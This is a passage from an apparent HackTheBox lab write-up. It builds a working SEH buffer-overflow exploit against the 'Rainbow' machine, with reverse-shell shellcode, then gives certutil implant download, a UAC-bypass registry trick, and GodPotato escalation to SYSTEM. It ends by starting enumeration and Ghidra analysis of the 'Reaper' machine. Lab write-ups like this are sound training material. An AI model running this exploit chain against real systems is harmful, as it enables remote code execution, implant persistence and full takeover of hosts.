*ASLR *DEP C:\\Windows\\SysWOW64\\msvcrt.dll\n75f30000 75fe9000 RPCRT4               /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\System32\\RPCRT4.dll\n76b10000 76d49000 KERNELBASE           /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\System32\\KERNELBASE.dll\n76f00000 77020000 ucrtbase             /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\System32\\ucrtbase.dll\n77050000 77140000 KERNEL32             /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\System32\\KERNEL32.DLL\n774a0000 77503000 WS2_32               /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\System32\\WS2_32.dll\n77550000 776f4000 ntdll                /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\SYSTEM32\\ntdll.dll\n\n*DEP/*ASLR means that these modules are compatible with ASLR/DEP\n</code></pre><p></p> <p>Well with null byte being a bad character, and given the address space of the binary, that means the boundary for the buffer has to end after the third byte of SEH in order to get the address placed on the stack correctly, because the last byte of the address is always null.   The end of the string (zero-terminated) will have to be what places the null byte for the fourth and final byte.</p> <p>Gadget hunt with a tool I built, that wraps around rp++. </p> <p>https://github.com/SYANiDE-/rp-ng</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/rainbow]\n\u2514\u2500$ rp++-ng --va 0x00400000 --file dump/rainbow.exe -r 3 --regex \"pop.*pop.*ret\" 2&gt;/dev/null\n\n  rp++-ng?                           ^^           \n            _________ _________      ___ __  __________ `\n   .       |    _o___|    _o___ ++- |   \\  |/   /_____/  !\n          |___|\\____|___|%%%%%     |____\\_|\\___\\____.] \n  z        `BB' `BBB'`B'           `BBBBBBB' `BBBBBBBB' \n     ;                                    Chain faster\n              [[                            $$$$$ $$$$$$      i\n                    +                                    SYANiDE\n\n\n0x4092ad: pop ecx ; pop ebp ; ret ; \n0x4094d8: pop ecx ; pop ecx ; ret ; \n0x409adc: pop edi ; pop esi ; pop ebx ; ret ; \n0x409b08: pop edi ; pop esi ; pop ebx ; ret ; \n0x4091b7: pop edi ; pop esi ; ret ; \n0x409add: pop esi ; pop ebx ; ret ; \n0x409b09: pop esi ; pop ebx ; ret ; \n</code></pre> <p>probably this one </p><pre><code>0x4094d8: pop ecx ; pop ecx ; ret ; \n</code></pre><p></p> <p>Removing the tail simplifies the buffer </p><pre><code>    total_len = 3908\n    crash_len = 664\n    head = \"POST / HTTP/1.1\\x0d\\x0aContent-Type: application/x-www-form-urlencoded\\x0d\\x0a\\x0d\\x0a\"\n    sled1 = (\"\\x40\" * crash_len)\n    SEH = \"\\xd8\\x94\\x40\"  ## 0x4094d8: pop ecx ; pop ecx ; ret ; \n    buf = f\"{head}{sled1}{SEH}\"\n</code></pre><p></p> <p>New breakpoint; break on pop pop ret. </p><pre><code>((cmd.exe /c \"taskkill /F /IM rainbow.exe\" &amp;&amp; timeout 3 &amp;&amp; START /B \"\" \"c:\\rainbow\\rainbow.exe\" &gt; c:\\users\\admin\\desktop\\current_thing\\output.txt) || START /B \"\" \"c:\\rainbow\\rainbow.exe\" &gt; c:\\users\\admin\\desktop\\current_thing\\output.txt) &amp;&amp; timeout 3 &amp;&amp; \"C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\windbg.exe\" -WF C:\\windbg_custom.WEW -pn rainbow.exe -c 'bp 0x4094d8; g'\n</code></pre><p></p> <p>Crash </p><pre><code>0:003&gt; !exchain\n009ff8e4: rainbow+a040 (0040a040)\n009ff924: rainbow+a040 (0040a040)\n009ffbe4: rainbow+94d8 (004094d8)\nInvalid exception stack at 40404040\n0:003&gt; t\nBreakpoint 0 hit\neax=00000000 ebx=00000000 ecx=004094d8 edx=775d9280 esi=00000000 edi=00000000\neip=004094d8 esp=009ff310 ebp=009ff330 iopl=0         nv up ei pl zr na pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246\nrainbow+0x94d8:\n004094d8 59              pop     ecx\n0:003&gt; t\neax=00000000 ebx=00000000 ecx=775d9262 edx=775d9280 esi=00000000 edi=00000000\neip=004094d9 esp=009ff314 ebp=009ff330 iopl=0         nv up ei pl zr na pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246\nrainbow+0x94d9:\n004094d9 59              pop     ecx\n0:003&gt; t\neax=00000000 ebx=00000000 ecx=009ff414 edx=775d9280 esi=00000000 edi=00000000\neip=004094da esp=009ff318 ebp=009ff330 iopl=0         nv up ei pl zr na pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246\nrainbow+0x94da:\n004094da c3              ret\n0:003&gt; dd esp L1\n009ff318  009ffbe4\n0:003&gt; dd 0x009ffbe4 L10\n009ffbe4  40404040 004094d8 00000005 009ffef0\n009ffbf4  004026b3 00546058 005460e8 005460e8\n009ffc04  009ffe74 0019eca8 0040b5a0 005460a8\n009ffc14  00000000 00000000 0040b55c 005464d0\n</code></pre><p></p> <p>Very nice, ret will return to the 0x40404040.  </p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#to-seh-or-nseh-that-is-the-question","title":"To SEH or nSEH, that is the question","text":"<p>Not much of a question</p> <p>Need a small kickback, maybe 0x8 bytes. </p><pre><code>nasm &gt; jmp short 0xf8\n00000000  EBF6              jmp short 0xfffffff8\n</code></pre><p></p> <pre><code>    total_len = 3908\n    crash_len = 664-4\n    head = \"POST / HTTP/1.1\\x0d\\x0aContent-Type: application/x-www-form-urlencoded\\x0d\\x0a\\x0d\\x0a\"\n    sled1 = (\"\\x40\" * crash_len)\n    nSEH = \"\\x90\\x90\\xeb\\xf0\"  ## nasm &gt; jmp short 0xf2 / EBF0 jmp short 0xfffffff2\n    SEH = \"\\xd8\\x94\\x40\"  ## 0x4094d8: pop ecx ; pop ecx ; ret ; \n    buf = f\"{head}{sled1}{nSEH}{SEH}\"\n</code></pre> <p>Very nice... three dwords worth of space after the short jump. </p><pre><code>0:003&gt; dd eip\n00a0fbd8  40404040 40404040 40404040 f0eb9090\n</code></pre><p></p> <p>At this time, the beginning of the usable range is about 648 bytes back </p><pre><code>0:003&gt; dd eip-0n648\n00a0f950  40404040 40404040 40404040 40404040\n00a0f960  40404040 40404040 40404040 40404040\n</code></pre><p></p> <p>registers </p><pre><code>0:003&gt; r\neax=00000000 ebx=00000000 ecx=00a0f414 edx=775d9280 esi=00000000 edi=00000000\neip=00a0fbd8 esp=00a0f31c ebp=00a0f330 iopl=0         nv up ei pl zr na pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246\n</code></pre><p></p> <p>Need to add about 0x648 hex to esp and jump there. But need to do it in a way that avoids null bytes.  In python:</p> <pre><code>&gt;&gt;&gt; hex(0x964-0x31c)\n'0x648'\n\n&gt;&gt;&gt; hex(0x00a3f31c + 0xfffff648)\n'0x100a3e964'\n</code></pre> <p>Not quite right though, it's about 0x1000 off.</p> <p>So instead it would make more sense to just write directly to the lower half of the dword.   Something like: </p><pre><code>mov sp,0xf952; jmp esp\n</code></pre><p></p> <p>The following should align, with a placeholder for shellcode </p><pre><code>    crash_len = 664-4-12\n    head = \"POST / HTTP/1.1\\x0d\\x0aContent-Type: application/x-www-form-urlencoded\\x0d\\x0a\\x0d\\x0a\"\n    sled1 = (\"\\x90\" * 0x14)\n    shellcode = (\"\\x41\" * (crash_len - len(sled1)))\n    nnSEH = (\n        \"\\x66\\xbc\\x52\\xf9\"  ## mov sp, 0xf952\n        \"\\xff\\xe4\"              ## jmp esp\n        \"\\x90\\x90\\x90\\x90\\x90\\x90\"\n    ) \n    nSEH = \"\\x90\\x90\\xeb\\xf0\"  ## nasm &gt; jmp short 0xf2 / EBF0 jmp short 0xfffffff2\n    SEH = \"\\xd8\\x94\\x40\"  ## 0x4094d8: pop ecx ; pop ecx ; ret ; \n\n    buf = f\"{head}{sled1}{shellcode}{nnSEH}{nSEH}{SEH}\"\n</code></pre><p></p> <p>After jmp esp, Perfect.  Land right at the beginning of <code>sled1</code> </p><pre><code>0:003&gt; dd eip\n009ef950  90909090 90909090 90909090 90909090\n009ef960  90909090 41414141 41414141 41414141\n009ef970  41414141 41414141 41414141 41414141\n009ef980  41414141 41414141 41414141 41414141\n009ef990  41414141 41414141 41414141 41414141\n</code></pre><p></p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#shellcode","title":"Shellcode","text":"<p>The only thing left to do is generate the shellcode and complete the PoC. </p><pre><code>#!/usr/bin/env python3\nimport os, sys, re, socket, binascii, time\nfrom struct import pack, unpack\n\nbadchars = \"\\x00\\x0a\"\ndef gen_badchars(bc, start=\"\\x01\", end=\"\\xff\"):\n    s_int = ord(start)\n    e_int = ord(end)+1\n    BC = bytearray(range(s_int,e_int)).decode('latin-1')\n    for item in bc:\n        BC = BC.replace(item,'')\n    return BC\n\ndef cx(ip, port, recv=0):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((ip, port))\n    if recv &gt; 0:\n        resp = sock.recv(4096)\n        print(resp)\n    return sock\n\ndef sender(sock, buf, send=0, recv=0):\n    if send &gt; 0:\n        sock.send(buf.encode('latin-1'))\n    if recv &gt; 0:\n        resp = sock.recv(4096)\n        return resp\n\ndef main():\n    if len(sys.argv) &lt; 2:\n        print(f\"USAGE: {sys.argv[0]} ip:port\")\n        sys.exit()\n    else:\n        ip, port = sys.argv[1].split(\":\")\n        port = int(port)\n        sock = cx(ip,port,0)\n\n    crash_len = 664-4-12\n    head = \"POST / HTTP/1.1\\x0d\\x0aContent-Type: application/x-www-form-urlencoded\\x0d\\x0a\\x0d\\x0a\"\n    sled1 = (\"\\x90\" * 0x14)\n    shellcode = (\n        ## msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.204 LPORT=443 EXITFUNC=thread -b \"\\x00\\x0a\" -f c\n        \"\\xba\\x92\\xee\\x4a\\x91\\xda\\xcb\\xd9\\x74\\x24\\xf4\\x58\\x2b\\xc9\"\n        \"\\xb1\\x52\\x31\\x50\\x12\\x83\\xe8\\xfc\\x03\\xc2\\xe0\\xa8\\x64\\x1e\"\n        \"\\x14\\xae\\x87\\xde\\xe5\\xcf\\x0e\\x3b\\xd4\\xcf\\x75\\x48\\x47\\xe0\"\n        \"\\xfe\\x1c\\x64\\x8b\\x53\\xb4\\xff\\xf9\\x7b\\xbb\\x48\\xb7\\x5d\\xf2\"\n        \"\\x49\\xe4\\x9e\\x95\\xc9\\xf7\\xf2\\x75\\xf3\\x37\\x07\\x74\\x34\\x25\"\n        \"\\xea\\x24\\xed\\x21\\x59\\xd8\\x9a\\x7c\\x62\\x53\\xd0\\x91\\xe2\\x80\"\n        \"\\xa1\\x90\\xc3\\x17\\xb9\\xca\\xc3\\x96\\x6e\\x67\\x4a\\x80\\x73\\x42\"\n        \"\\x04\\x3b\\x47\\x38\\x97\\xed\\x99\\xc1\\x34\\xd0\\x15\\x30\\x44\\x15\"\n        \"\\x91\\xab\\x33\\x6f\\xe1\\x56\\x44\\xb4\\x9b\\x8c\\xc1\\x2e\\x3b\\x46\"\n        \"\\x71\\x8a\\xbd\\x8b\\xe4\\x59\\xb1\\x60\\x62\\x05\\xd6\\x77\\xa7\\x3e\"\n        \"\\xe2\\xfc\\x46\\x90\\x62\\x46\\x6d\\x34\\x2e\\x1c\\x0c\\x6d\\x8a\\xf3\"\n        \"\\x31\\x6d\\x75\\xab\\x97\\xe6\\x98\\xb8\\xa5\\xa5\\xf4\\x0d\\x84\\x55\"\n        \"\\x05\\x1a\\x9f\\x26\\x37\\x85\\x0b\\xa0\\x7b\\x4e\\x92\\x37\\x7b\\x65\"\n        \"\\x62\\xa7\\x82\\x86\\x93\\xee\\x40\\xd2\\xc3\\x98\\x61\\x5b\\x88\\x58\"\n        \"\\x8d\\x8e\\x1f\\x08\\x21\\x61\\xe0\\xf8\\x81\\xd1\\x88\\x12\\x0e\\x0d\"\n        \"\\xa8\\x1d\\xc4\\x26\\x43\\xe4\\x8f\\x42\\x9e\\xe8\\x83\\x3b\\x9c\\xf4\"\n        \"\\x1a\\x07\\x29\\x12\\x76\\x67\\x7c\\x8d\\xef\\x1e\\x25\\x45\\x91\\xdf\"\n        \"\\xf3\\x20\\x91\\x54\\xf0\\xd5\\x5c\\x9d\\x7d\\xc5\\x09\\x6d\\xc8\\xb7\"\n        \"\\x9c\\x72\\xe6\\xdf\\x43\\xe0\\x6d\\x1f\\x0d\\x19\\x3a\\x48\\x5a\\xef\"\n        \"\\x33\\x1c\\x76\\x56\\xea\\x02\\x8b\\x0e\\xd5\\x86\\x50\\xf3\\xd8\\x07\"\n        \"\\x14\\x4f\\xff\\x17\\xe0\\x50\\xbb\\x43\\xbc\\x06\\x15\\x3d\\x7a\\xf1\"\n        \"\\xd7\\x97\\xd4\\xae\\xb1\\x7f\\xa0\\x9c\\x01\\xf9\\xad\\xc8\\xf7\\xe5\"\n        \"\\x1c\\xa5\\x41\\x1a\\x90\\x21\\x46\\x63\\xcc\\xd1\\xa9\\xbe\\x54\\xf1\"\n        \"\\x4b\\x6a\\xa1\\x9a\\xd5\\xff\\x08\\xc7\\xe5\\x2a\\x4e\\xfe\\x65\\xde\"\n        \"\\x2f\\x05\\x75\\xab\\x2a\\x41\\x31\\x40\\x47\\xda\\xd4\\x66\\xf4\\xdb\"\n        \"\\xfc\"## 351\n    )\n    sled2 = (\"\\x41\" * (crash_len - len(sled1) - len(shellcode)))\n    nnSEH = (\n        \"\\x66\\xbc\\x50\\xf9\"  ## mov sp, 0xf950\n        \"\\xff\\xe4\"              ## jmp esp\n        \"\\x90\\x90\\x90\\x90\\x90\\x90\"\n    ) \n    nSEH = \"\\x90\\x90\\xeb\\xf0\"  ## nasm &gt; jmp short 0xf2 / EBF0 jmp short 0xfffffff2\n    SEH = \"\\xd8\\x94\\x40\"  ## 0x4094d8: pop ecx ; pop ecx ; ret ; \n\n    buf = f\"{head}{sled1}{shellcode}{sled2}{nnSEH}{nSEH}{SEH}\"\n    resp = sender(sock, buf, 1, 1)\n\n\nif __name__==\"__main__\":\n    main()\n</code></pre><p></p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#getting-a-foothold","title":"Getting a foothold","text":"<p>It shells:</p> <p></p> <p>Flag </p><pre><code>C:\\Users\\rainbow\\Desktop&gt;type user.txt\ntype user.txt\n881288e2cd563fa856fcb4163b91ec06\n</code></pre><p></p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#post-exploitation-enumeration","title":"Post-exploitation enumeration","text":"<p>Need to upgrade my shell to something a little more feature rich, reliable, etc.</p> <p>Download  a Sliver implant to the host </p><pre><code>C:\\rainbow&gt;certutil -urlcache -f -split http://10.10.14.204:8083/10.10.14.204.exe \\windows\\tasks\\a.exe\ncertutil -urlcache -f -split http://10.10.14.204:8083/10.10.14.204.exe \\windows\\tasks\\a.exe\n****  Online  ****\n  000000  ...\n  988a00\nCertUtil: -URLCache command completed successfully.\n</code></pre><p></p> <p>The current shell env is 32 bit (of course), but the system is 64bit </p><pre><code>C:\\rainbow&gt;set proc\nset proc\nPROCESSOR_ARCHITECTURE=x86\nPROCESSOR_ARCHITEW6432=AMD64\nPROCESSOR_IDENTIFIER=AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD\nPROCESSOR_LEVEL=25\nPROCESSOR_REVISION=0101\n</code></pre><p></p> <p>So I will use 64bit cmd.exe to launch the sliver implant. </p><pre><code>C:\\rainbow&gt;c:\\windows\\sysnative\\cmd.exe /c \\windows\\tasks\\a.exe\nc:\\windows\\sysnative\\cmd.exe /c \\windows\\tasks\\a.exe\n</code></pre><p></p> <p>Sharpup audit, found that UAC can be bypassed. </p><pre><code>sliver (REMOTE_JACKAL) &gt; sharpup -t 300 -i -- audit\n\n[*] sharpup output:\n\n=== SharpUp: Running Privilege Escalation Checks ===\n\n[*] In medium integrity but user is a local administrator- UAC can be bypassed.\n\n[*] Audit mode: running an additional 15 check(s).\nRegistry AutoLogon Found\n\n[!] Modifialbe scheduled tasks were not evaluated due to permissions.\n\n=== Registry AutoLogons ===\n</code></pre><p></p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#elevate","title":"Elevate","text":"<p>I'll try a number of UAC bypasses.  What I found worked for me is the ComputerDefaults bypass.</p> <pre><code>New-Item \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Force\nNew-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"(default)\" -Value \"cmd.exe /c \\windows\\tasks\\a.exe\" -Force\n\n\\#\\# Then execute with:  ComputerDefaults.exe (triggers based on the same registry key.  Full path pops defender, try running without full path)\nc:\\Windows\\System32\\ComputerDefaults.exe\n</code></pre> <p>I get a new session: </p><pre><code>[*] Session e7b84ea7 REMOTE_JACKAL - 10.129.35.177:63623 (rainbow) - windows/amd64 - Sun, 26 Oct 2025 17:02:15 PDT\n\nsliver (REMOTE_JACKAL) &gt;\n</code></pre><p></p> <p>I'll clean up the registry </p><pre><code>Remove-Item \"HKCU:\\Software\\Classes\\ms-settings\\\" -Recurse -Force\n</code></pre><p></p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#escalate","title":"Escalate","text":"<p>On the new session, I find that the process integrity is High, and the process tokens include SeImpersonatePrivilege in an enabled state</p> <p></p> <p>Upload GodPotato </p><pre><code>sliver (REMOTE_JACKAL) &gt; upload /var/www/html/GodPotato-NET4.exe /windows/tasks/GodPotato.exe\n\n[*] Wrote file to C:\\windows\\tasks\\GodPotato.exe\n</code></pre><p></p> <p>Loosen DACLs around files in <code>c:\\windows\\tasks</code> </p><pre><code>$path=\"c:\\windows\\tasks\"; (Get-ChildItem -path $path\\* -Recurse).FullName | % {$Acl = Get-ACL $_; $AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule(\"Everyone\",\"FullControl\",\"none\",\"none\",\"Allow\");$Acl.AddAccessRule($AccessRule);Set-Acl $_ $Acl}\n</code></pre><p></p> <p>Execute GodPotato, have it daemonize another instance of the Sliver implant </p><pre><code>PS C:\\windows\\tasks&gt; .\\GodPotato.exe -cmd \"cmd.exe /c \\windows\\tasks\\a.exe\"\n.\\GodPotato.exe -cmd \"cmd.exe /c \\windows\\tasks\\a.exe\"\n[*] CombaseModule: 0x140709195350016\n[*] DispatchTable: 0x140709197652048\n[*] UseProtseqFunction: 0x140709197029744\n[*] UseProtseqFunctionParamCount: 6\n[*] HookRPC\n[*] Start PipeServer\n[*] CreateNamedPipe \\\\.\\pipe\\aabfbcee-7777-4b84-bb35-19b7430af1b9\\pipe\\epmapper\n[*] Trigger RPCSS\n[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046\n[*] DCOM obj IPID: 00000802-16c8-ffff-1d75-8eaf76328c8b\n[*] DCOM obj OXID: 0x48fca28fb7e0a860\n[*] DCOM obj OID: 0xdc03a523a80cc5fc\n[*] DCOM obj Flags: 0x281\n[*] DCOM obj PublicRefs: 0x0\n[*] Marshal Object bytes len: 100\n[*] UnMarshal Object\n[*] Pipe Connected!\n[*] CurrentUser: NT AUTHORITY\\NETWORK SERVICE\n[*] CurrentsImpersonationLevel: Impersonation\n[*] Start Search System Token\n[*] PID : 908 Token:0x844  User: NT AUTHORITY\\SYSTEM ImpersonationLevel: Impersonation\n[*] Find System Token : True\n[*] UnmarshalObject: 0x80070776\n[*] CurrentUser: NT AUTHORITY\\SYSTEM\n[*] process start with pid 6848\n</code></pre><p></p> <p>A new session is born </p><pre><code>sliver (REMOTE_JACKAL) &gt; use aff2989a-17bd-4cce-a0ea-6c3c1188e23e\n\n[*] Active session REMOTE_JACKAL (aff2989a-17bd-4cce-a0ea-6c3c1188e23e)\n\nsliver (REMOTE_JACKAL) &gt; getuid\n\nS-1-5-18\n\nsliver (REMOTE_JACKAL) &gt; whoami\n\nLogon ID: NT AUTHORITY\\SYSTEM\n[*] Current Token ID: NT AUTHORITY\\SYSTEM\n</code></pre><p></p> <p>Root flag </p><pre><code>sliver (REMOTE_JACKAL) &gt; cat /users/administrator/desktop/root.txt\n\n4f5858163e52fd36d6cb7c6074c50a40\n</code></pre><p></p> <p></p>"},{"location":"writeups/HackTheBox/Machines/Reaper/","title":"Reaper","text":""},{"location":"writeups/HackTheBox/Machines/Reaper/#enumeration","title":"Enumeration","text":"<pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb]\n\u2514\u2500$ nmap -A -Pn 10.129.234.200\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 13:25 PDT\nNmap scan report for 10.129.234.200\nHost is up (0.17s latency).\nNot shown: 997 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n21/tcp   open  ftp           Microsoft ftpd\n| ftp-syst: \n|_  SYST: Windows_NT\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| 08-15-23  12:12AM                  262 dev_keys.txt\n|_08-14-23  02:53PM               187392 dev_keysvc.exe\n80/tcp   open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-title: IIS Windows\n|_http-server-header: Microsoft-IIS/10.0\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: REAPER\n|   NetBIOS_Domain_Name: REAPER\n|   NetBIOS_Computer_Name: REAPER\n|   DNS_Domain_Name: reaper\n|   DNS_Computer_Name: reaper\n|   Product_Version: 10.0.19041\n|_  System_Time: 2025-10-31T20:26:47+00:00\n|_ssl-date: 2025-10-31T20:26:51+00:00; -4s from scanner time.\n| ssl-cert: Subject: commonName=reaper\n| Not valid before: 2025-10-30T20:18:22\n|_Not valid after:  2026-05-01T20:18:22\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 10|2019 (97%)\nOS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019\nAggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (97%), Windows Server 2019 (91%), Microsoft Windows 10 1803 (89%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: -4s, deviation: 0s, median: -4s\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT       ADDRESS\n1   198.18 ms 10.10.16.1\n2   198.32 ms 10.129.234.200\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 57.58 seconds\n</code></pre> <p>Nmap discovered an FTP service, and that service allows <code>Anonymous</code> authentication.   So I connect to it, authenticating with <code>Anonymous:&lt;no password&gt;</code>, switch to <code>binary</code> mode, and use <code>mget *</code> to download the files.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ ftp reaper.vl 21\nConnected to reaper.vl.\n220 Microsoft FTP Service\nName (reaper.vl:notroot): Anonymous\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword: \n230 User logged in.\nRemote system type is Windows_NT.\nftp&gt; ls\n229 Entering Extended Passive Mode (|||5001|)\n125 Data connection already open; Transfer starting.\n08-15-23  12:12AM                  262 dev_keys.txt\n08-14-23  02:53PM               187392 dev_keysvc.exe\n226 Transfer complete.\nftp&gt; binary\n200 Type set to I.\nftp&gt; mget *\nmget dev_keys.txt [anpqy?]? a\nPrompting off for duration of mget.\n229 Entering Extended Passive Mode (|||5003|)\n125 Data connection already open; Transfer starting.\n100% |***************************************************************|   262        1.45 KiB/s    00:00 ETA\n226 Transfer complete.\n262 bytes received in 00:00 (0.92 KiB/s)\n229 Entering Extended Passive Mode (|||5004|)\n125 Data connection already open; Transfer starting.\n100% |***************************************************************|   183 KiB  128.52 KiB/s    00:00 ETA\n226 Transfer complete.\n187392 bytes received in 00:01 (120.19 KiB/s)\nftp&gt; exit\n221 Goodbye.\n</code></pre> <p>Inside the <code>dev_keys.txt</code>:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ cat dev_keys.txt \nDevelopment Keys:\n\n100-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==\n101-FE9A1-550-A271-0109-UHJlbWl1bSBMaWNlbnNl\n102-FE9A1-500-A272-0106-UHJlbWl1bSBMaWNlbnNl\n\nThe dev keys can not be activated yet, we are working on fixing a bug in the activation function.\n</code></pre> <p>It contains three UUID-like strings, each ending in what appears to be <code>base64</code>.   They translate to <code>Standard License</code> and <code>Premium License</code> respectively</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ file dev_keys.txt \ndev_keys.txt: ASCII text, with CRLF line terminators\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ dos2unix dev_keys.txt \ndos2unix: converting file dev_keys.txt to Unix format...\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ cat dev_keys.txt | grep -- - | cut -d '-' -f 6 | for b64 in $(cat -); do base64 -d &lt;&lt;&lt;$b64 ; echo \"\"; done\nStandard License\nPremium License\nPremium License\n</code></pre> <p>Running the application in my sandbox Windows VM, I found the application listens on port <code>4141</code></p> <pre><code>PS C:\\reaper&gt; .\\dev_keysvc.exe\nServer listening on port 4141\n</code></pre> <p>Confirmed by <code>nmap</code> on the <code>REAPER</code> host</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ nmap -sT -Pn reaper.vl -p 4141\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 21:53 PDT\nNmap scan report for reaper.vl (10.129.234.200)\nHost is up (0.10s latency).\n\nPORT     STATE SERVICE\n4141/tcp open  oirtgsvc\n\nNmap done: 1 IP address (1 host up) scanned in 0.12 seconds\n</code></pre> <p><code>Ghidra</code> shows that the binary is a 64bit executable.  This is made obvious by the fact that the address size is 64, and the min/max address is in a range that is also only possible in a 64bit context.</p> <p></p>"},{"location":"writeups/HackTheBox/Machines/Reaper/#ghidra-analysis","title":"Ghidra analysis","text":"<p>The entrypoint starts out by creating a stack cookie.  The only other function call is to <code>__scrt_common_main_seh()</code></p> <p></p>"},{"location":"writeups/HackTheBox/Machines/Reaper/#common_main_seh","title":"common_main_seh()","text":"<p>Once within this function, the function of interest is <code>FUN_140001bd0()</code>, which I have renamed to <code>bind_server</code> due to functions with ordinal numbers, which align to <code>ws2_32.dll</code>, and calls consistent with standing up a bind server.</p> <p></p>"},{"location":"writeups/HackTheBox/Machines/Reaper/#bind_server","title":"bind_server()","text":"<p>A list of <code>ws2_32</code> ordinals: https://strontic.github.io/xcyclopedia/library/ws2_32.dll-9AB0235EC0B3AAC2A9E82C18B4677F89.html</p> <p>The list is hard to digest due to sorting by function name.  It's easier to fix this by just copying them to a file, transforming it a bit, and sorting it by ordinal numerically, out to a csv format.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ cat ws2_32.ordinals.txt | sed -re 's/\\t/,/g' -e 's/[ ]+/ /g' -e 's/ ,/,/g' | cut -d ',' -f 1,2 | awk -F ',' '{print $2\",\"$1}' |sort -n &gt; ordinals_ws2_32.csv\n</code></pre> <p>Then, I can just create an <code>sqlite</code> database, create a table for the data, and import it.</p> <pre><code>sqlite3 ws2_32.db\ncreate table ws2_32 ( ordinal int32, name varchar[32] );\n.mode csv\n.import ordinals_ws2_32.csv ws2_32\n</code></pre> <p>Now in <code>bind_server()</code>:</p> <p></p> <p>I am seeing calls to ordinals in the following order: </p><pre><code>115\n23\n9\n2\n13\n1\n</code></pre><p></p> <p>These translate to the following <code>ws2_32</code> function calls:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ for ordinal in 115 23 9 2 13 1; do sqlite3 ws2_32.db \"select * from ws2_32 where ordinal == $ordinal\"; done\n115|WSAStartup\n23|socket\n9|htons\n2|bind\n13|listen\n1|accept\n</code></pre> <p>Making it easier to visually follow once the references are renamed (a manual process but well worth it, wherever possible)</p> <p></p> <p>But, it's really here within line 49 where we are interested.</p> <p></p> <ol> <li><code>FUN_14000ee50</code>: This function calls functions like <code>CreateThread</code>, <code>CloseHandle</code>, and <code>FreeLibrary</code> </li> <li><code>FUN_140001000</code>:  This function calls <code>VirtualAlloc</code> twice, followed by <code>ws2_32</code> ordinals 19, 16, and 3</li> </ol> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ for ordinal in 19 16 3; do sqlite3 ws2_32.db \"select * from ws2_32 where ordinal == $ordinal\"; done\n19|send\n16|recv\n3|closesocket\n</code></pre> <p>It is for that reason I have named the function <code>bind_client</code>.  This is a function well worth examining closely, as this is a function that handles user input.</p>"},{"location":"writeups/HackTheBox/Machines/Reaper/#bind_client","title":"bind_client()","text":"<p>We can see on line 24 and 25 above that there are two <code>VirtualAlloc</code>s that occur into local variables <code>local_48</code> and <code>local_40</code>.  Probably <code>recv</code> and <code>working_set</code> type buffers.  On line 27 it is shown a string, likely one that will be used in a prompt to select an option, either (1) <code>Set key</code> or (2) <code>Activate key</code>.  We enter into a <code>while</code> loop that is greater than what is displayed, and immediately enter into two more 